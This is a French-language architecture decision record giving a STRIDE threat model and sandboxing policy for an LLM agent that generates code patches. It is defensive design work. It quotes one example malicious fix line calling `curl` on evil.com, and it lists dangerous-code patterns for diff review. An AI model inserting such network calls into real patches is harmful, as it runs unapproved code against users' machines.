# ADR-0018 — Threat Model + Sandboxing des Patches

**Date** : 2026-06-17
**Statut** : Proposé
**Décideurs** : Erwan Barat, Mavis

## Contexte

L'agent V-max exécute du code arbitraire sur la machine de l'utilisateur :
- Scanners (ruff, clippy, trufflehog) → lecture seule, mais outils tiers
- Patch generation (`debt-fix`) → écriture de fichiers dans le repo
- Hooks (`pretool-loc-gate`, `permission-readonly-env`) → interceptent l'agent LLM

Risques identifiés pendant la re-analyse du plan :
- **#11** Sandboxing des patches (exécution non bornée)
- **#27** Secrets découverts (stockage accidentel)
- **#28** Divulgation responsable (coordination avec mainteneurs)

## Modélisation des menaces (STRIDE)

### Spoofing
- **S1** : un attaquant forge un fichier `EXPECTED_FINDINGS.json` pour manipuler le critic
  - Vecteur : un dev malveillant commit un fichier forgé qui passe tous les filtres
  - Mitigation : signature cryptographique des fichiers de config (à documenter en V2.5)

### Tampering
- **T1** : un patch généré par `debt-fix` altère du code non-autorisé
  - Vecteur : l'agent a un bug et modifie un fichier hors whitelist
  - Mitigation : **dry-run obligatoire**, validation humaine avant merge (V1 actuel ✓)
- **T2** : un utilisateur override le critic et applique un fix dangereux
  - Vecteur : l'humain force un fix sans comprendre les implications
  - Mitigation : `override_requires_reason` + log dans le KG (V2)

### Repudiation
- **R1** : un fix est appliqué mais personne ne sait qui a autorisé
  - Vecteur : l'agent patch + l'humain approve, mais pas de trace
  - Mitigation : chaque fix log dans `feedback.json` (user_id, timestamp, reason) — V2

### Information Disclosure
- **I1** : trufflehog détecte une vraie clé API → l'agent l'écrit dans `debt-history.json`
  - Vecteur : le scanner affiche le secret en clair dans son output, l'agent le log
  - Mitigation : **chiffrement at-rest des secrets détectés**, output masqué (préfixe seulement)
- **I2** : RGPD — l'agent scanne des commentaires qui contiennent des données personnelles
  - Vecteur : un dev met un nom/email dans un commentaire, l'agent le signale comme "dette de doc"
  - Mitigation : filtre de PII sur les findings avant stockage (V2.5)

### Denial of Service
- **D1** : un attaquant injecte 100k fichiers vides pour faire exploser le temps de scan
  - Vecteur : spam du repo
  - Mitigation : cap sur le nombre de fichiers scannés par run (V1.2)
- **D2** : un KG corrompu bloque l'agent
  - Vecteur : disque plein, fichier tronqué
  - Mitigation : `kg_integrity_check.py` quotidien + restore depuis snapshot

### Elevation of Privilege
- **E1** : un patch `debt-fix` injecte du code arbitraire
  - Vecteur : le LLM hallucine un fix qui ajoute `subprocess.run(['curl', 'evil.com'])`
  - Mitigation : **fix toujours en dry-run**, validation humaine OBLIGATOIRE (V1 ✓)
  - Renforcement : review pattern du diff (regex sur `subprocess|os.system|eval`) avant merge

## Sandboxing des patches

### Politique actuelle (V1)

```
Fix generation (debt-fix) :
  - Produit un fichier .patch (unified diff)
  - Produit un fichier .test.patch (test associé)
  - Produit un fichier .rollback.md (procédure de rollback)
  - N'applique JAMAIS automatiquement
  - Attend un "apply" explicite de l'humain
```

### Renforcements proposés (V2)

1. **Scope strict** : chaque fix a une whitelist de fichiers modifiables
2. **Pattern review** : avant d'émettre un fix, le critic scanne le diff pour des patterns dangereux :
   - `subprocess.run(shell=True)` ou `os.system()`
   - `eval(` ou `exec(`
   - `requests.post` vers des URLs non-locales
   - `open(` en mode write sur des chemins sensibles
3. **Sandbox exécution** : si le fix doit être exécuté pour vérification, c'est dans un conteneur éphémère (Docker, firejail)
4. **Audit log** : chaque fix généré/appliqué/rejeté est loggé dans le KG (V2)

## Révocation des secrets découverts

Quand trufflehog/gitleaks détecte un secret :
1. **L'output est masqué** : seuls les 4 premiers caractères + `...` sont visibles dans les logs/findings
2. **Le secret complet n'est JAMAIS persisté** dans le KG ou le vault
3. **Une alerte critique** est levée avec un lien vers la procédure de révocation
4. **L'humain doit révoquer manuellement** le secret + committer le fix qui le supprime

## Divulgation responsable (V2.5+)

Si l'agent découvre une vulnérabilité critique dans une dépendance tierce :
1. **Alerte locale** immédiate (l'humain est notifié)
2. **Vérification croisée** : l'agent croise avec NVD/OSV/GitHub Advisories
3. **Template de report** : l'humain a un template pré-rempli pour signaler aux mainteneurs
4. **Embargo respecté** : l'agent ne pousse jamais de patch public avant un délai configurable (défaut: 90 jours)

## Critères d'acceptation

- [ ] Aucun secret complet n'est jamais persisté (test : scanner le vault et le KG pour des patterns de secrets)
- [ ] Chaque fix généré est en dry-run (test : vérifier qu'aucun fichier n'est modifié automatiquement)
- [ ] Le pattern review bloque les patterns dangereux (test : injecter un fix malveillant, vérifier qu'il est refusé)
- [ ] Le KG a un integrity check quotidien (test : corrompre le KG, vérifier que l'alerte se déclenche)
- [ ] Un override humain est loggé avec reason (test : override sans reason, vérifier le refus)

## Liens

- ADR-0017 (architecture)
- ADR-0022 (versionning)
- ADR-0020 (concurrence)
